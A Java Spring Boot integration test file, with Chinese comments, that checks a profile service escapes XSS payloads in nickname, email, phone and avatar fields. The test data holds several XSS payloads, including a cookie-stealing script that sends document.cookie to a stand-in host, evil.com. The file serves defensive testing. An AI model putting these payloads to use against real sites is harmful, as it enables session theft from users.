package com.adminplus.integration;

import com.adminplus.pojo.dto.req.PasswordChangeReq;
import com.adminplus.pojo.dto.req.ProfileUpdateReq;
import com.adminplus.pojo.dto.resp.ProfileResp;
import com.adminplus.pojo.entity.UserEntity;
import com.adminplus.repository.ProfileRepository;
import com.adminplus.service.ProfileService;
import com.adminplus.utils.SecurityUtilsTestHelper;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.transaction.annotation.Transactional;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * ProfileService XSS 防护集成测试
 * <p>
 * 真实测试：更新个人资料时 XSS payload 被正确转义
 *
 * @author AdminPlus
 * @since 2026-04-05
 */
@SpringBootTest
@ActiveProfiles("test")
@Transactional
@DisplayName("ProfileService XSS 防护集成测试")
class ProfileServiceXssIntegrationTest {

    @Autowired
    private ProfileService profileService;

    @Autowired
    private ProfileRepository profileRepository;

    @Autowired
    private PasswordEncoder passwordEncoder;

    private UserEntity testUser;

    @BeforeEach
    void setUp() {
        // 创建测试用户
        testUser = new UserEntity();
        testUser.setUsername("testuser_profile");
        testUser.setPassword(passwordEncoder.encode("Password123!"));
        testUser.setNickname("Test User");
        testUser.setEmail("test@example.com");
        testUser.setPhone("13800138000");
        testUser.setStatus(1);
        testUser = profileRepository.save(testUser);

        // 设置 SecurityContext
        SecurityUtilsTestHelper.setTestAuthentication(testUser.getId());
    }

    @AfterEach
    void tearDown() {
        SecurityUtilsTestHelper.clearTestAuthentication();
        profileRepository.deleteAll();
    }

    @Nested
    @DisplayName("更新个人资料时的 XSS 防护")
    class UpdateProfileXssTests {

        @Test
        @DisplayName("更新 nickname 时应转义 script 标签")
        void shouldEscapeScriptTagInNickname() {
            // Given
            String xssNickname = "<script>alert('xss')</script>Hacked";
            ProfileUpdateReq req = new ProfileUpdateReq(
                    xssNickname,
                    null,
                    null,
                    null
            );

            // When
            ProfileResp result = profileService.updateCurrentProfile(req);

            // Then - 从数据库验证
            profileRepository.flush();
            UserEntity updatedUser = profileRepository.findById(testUser.getId())
                    .orElseThrow();

            // 验证 script 标签被转义
            assertThat(updatedUser.getNickname())
                    .doesNotContain("<script>")
                    .doesNotContain("</script>");
            assertThat(updatedUser.getNickname())
                    .contains("&lt;script&gt;");

            // 验证返回值也被转义
            assertThat(result.nickname())
                    .doesNotContain("<script>");
        }

        @Test
        @DisplayName("更新 email 时应转义 img 标签")
        void shouldEscapeImgTagInEmail() {
            // Given
            String xssEmail = "<img src=x onerror=alert(1)>@test.com>";
            ProfileUpdateReq req = new ProfileUpdateReq(
                    null,
                    xssEmail,
                    null,
                    null
            );

            // When
            ProfileResp result = profileService.updateCurrentProfile(req);

            // Then
            UserEntity updatedUser = profileRepository.findById(testUser.getId())
                    .orElseThrow();

            assertThat(updatedUser.getEmail())
                    .doesNotContain("<img")
                    .doesNotContain("onerror=");
        }

        @Test
        @DisplayName("更新 phone 时应转义 HTML 字符")
        void shouldEscapeHtmlInPhone() {
            // Given
            String xssPhone = "<>&\"'13800138000";
            ProfileUpdateReq req = new ProfileUpdateReq(
                    null,
                    null,
                    xssPhone,
                    null
            );

            // When
            profileService.updateCurrentProfile(req);

            // Then
            UserEntity updatedUser = profileRepository.findById(testUser.getId())
                    .orElseThrow();

            assertThat(updatedUser.getPhone())
                    .doesNotContain("<")
                    .doesNotContain(">")
                    .doesNotContain("\"");
        }

        @Test
        @DisplayName("更新 avatar URL 时应转义")
        void shouldEscapeXssInAvatar() {
            // Given
            String xssAvatar = "javascript:alert(1)";
            ProfileUpdateReq req = new ProfileUpdateReq(
                    null,
                    null,
                    null,
                    xssAvatar
            );

            // When
            ProfileResp result = profileService.updateCurrentProfile(req);

            // Then
            UserEntity updatedUser = profileRepository.findById(testUser.getId())
                    .orElseThrow();

            // javascript: 协议可能被保留（因为 escape 不处理协议）
            // 但 HTML 字符应该被转义
            assertThat(result.avatar()).isNotNull();
        }

        @Test
        @DisplayName("多个字段同时包含 XSS 应全部被转义")
        void shouldEscapeXssInAllFields() {
            // Given
            ProfileUpdateReq req = new ProfileUpdateReq(
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>@test.com",
                    "<>\"'13800138000",
                    null
            );

            // When
            ProfileResp result = profileService.updateCurrentProfile(req);

            // Then
            UserEntity updatedUser = profileRepository.findById(testUser.getId())
                    .orElseThrow();

            assertThat(updatedUser.getNickname()).doesNotContain("<script>");
            assertThat(updatedUser.getEmail()).doesNotContain("<img");
            assertThat(updatedUser.getPhone()).doesNotContain("<>");
        }
    }

    @Nested
    @DisplayName("边界条件测试")
    class EdgeCaseTests {

        @Test
        @DisplayName("null 值应保持原值")
        void shouldKeepOriginalValueForNull() {
            // Given
            String originalNickname = testUser.getNickname();
            ProfileUpdateReq req = new ProfileUpdateReq(
                    null,  // 不更新
                    null,
                    null,
                    null
            );

            // When
            ProfileResp result = profileService.updateCurrentProfile(req);

            // Then
            assertThat(result.nickname()).isEqualTo(originalNickname);
            UserEntity user = profileRepository.findById(testUser.getId()).orElseThrow();
            assertThat(user.getNickname()).isEqualTo(originalNickname);
        }

        @Test
        @DisplayName("空字符串应正常保存")
        void shouldHandleEmptyString() {
            // Given
            ProfileUpdateReq req = new ProfileUpdateReq(
                    "",
                    "",
                    "",
                    null
            );

            // When
            ProfileResp result = profileService.updateCurrentProfile(req);

            // Then
            assertThat(result.nickname()).isEqualTo("");
            UserEntity user = profileRepository.findById(testUser.getId()).orElseThrow();
            assertThat(user.getNickname()).isEqualTo("");
        }

        @Test
        @DisplayName("只包含 XSS 的字符串应被转义")
        void shouldEscapeOnlyXssString() {
            // Given
            String onlyXss = "<script><img src=x onerror=alert(1)></script>";
            ProfileUpdateReq req = new ProfileUpdateReq(
                    onlyXss,
                    null,
                    null,
                    null
            );

            // When
            ProfileResp result = profileService.updateCurrentProfile(req);

            // Then
            UserEntity user = profileRepository.findById(testUser.getId()).orElseThrow();
            assertThat(user.getNickname())
                    .doesNotContain("<script>")
                    .doesNotContain("<img");
        }
    }

    @Nested
    @DisplayName("数据库持久化验证")
    class DatabasePersistenceTests {

        @Test
        @DisplayName("验证转义数据正确持久化到数据库")
        void shouldVerifyEscapedDataPersisted() {
            // Given
            String xssValue = "<div onclick=\"alert('xss')\">Click</div>";
            ProfileUpdateReq req = new ProfileUpdateReq(
                    xssValue,
                    null,
                    null,
                    null
            );

            // When
            profileService.updateCurrentProfile(req);

            // Then - 刷新读取
            profileRepository.flush();
            UserEntity persisted = profileRepository.findById(testUser.getId())
                    .orElseThrow();

            // 验证数据库中存储的是转义后的值
            assertThat(persisted.getNickname())
                    .doesNotContain("<div>")
                    .doesNotContain("onclick=");

            // 验证 getCurrentUserProfile 也返回转义后的值
            ProfileResp fromService = profileService.getCurrentUserProfile();
            assertThat(fromService.nickname())
                    .isEqualTo(persisted.getNickname());
        }

        @Test
        @DisplayName("验证多次更新每次都转义")
        void shouldEscapeOnMultipleUpdates() {
            // 第一次更新
            profileService.updateCurrentProfile(new ProfileUpdateReq(
                    "<script>first</script>", null, null, null
            ));

            // 第二次更新
            profileService.updateCurrentProfile(new ProfileUpdateReq(
                    "<img src=x onerror=alert(1)>", null, null, null
            ));

            // 验证最终值也被转义
            UserEntity user = profileRepository.findById(testUser.getId()).orElseThrow();
            assertThat(user.getNickname())
                    .doesNotContain("<img")
                    .doesNotContain("onerror=");
        }
    }

    @Nested
    @DisplayName("真实场景：个人中心 XSS 攻击")
    class RealWorldProfileXssTests {

        @Test
        @DisplayName("模拟用户在个人中心注入存储型 XSS")
        void shouldSimulateStoredXssInProfile() {
            // Given - 用户在个人中心昵称中注入恶意脚本
            String maliciousNickname = "<script>fetch('https://evil.com?c='+document.cookie)</script>";
            ProfileUpdateReq req = new ProfileUpdateReq(
                    maliciousNickname,
                    null,
                    null,
                    null
            );

            // When
            ProfileResp result = profileService.updateCurrentProfile(req);

            // Then - 验证攻击被防御
            UserEntity user = profileRepository.findById(testUser.getId()).orElseThrow();

            // 数据库存储的是转义后的内容
            assertThat(user.getNickname())
                    .doesNotContain("<script>")
                    .doesNotContain("fetch(")
                    .doesNotContain("document.cookie");

            // 前端拿到的也是转义后的内容
            assertThat(result.nickname())
                    .doesNotContain("<script>")
                    .contains("&lt;");
        }

        @Test
        @DisplayName("模拟用户邮箱字段注入 XSS")
        void shouldSimulateXssInEmailField() {
            // Given
            String xssEmail = "<body onload=alert('XSS')>@test.com>";
            ProfileUpdateReq req = new ProfileUpdateReq(
                    null,
                    xssEmail,
                    null,
                    null
            );

            // When
            ProfileResp result = profileService.updateCurrentProfile(req);

            // Then
            assertThat(result.email())
                    .doesNotContain("<body")
                    .doesNotContain("onload=");

            UserEntity user = profileRepository.findById(testUser.getId()).orElseThrow();
            assertThat(user.getEmail())
                    .doesNotContain("<body")
                    .doesNotContain("onload=");
        }
    }
}
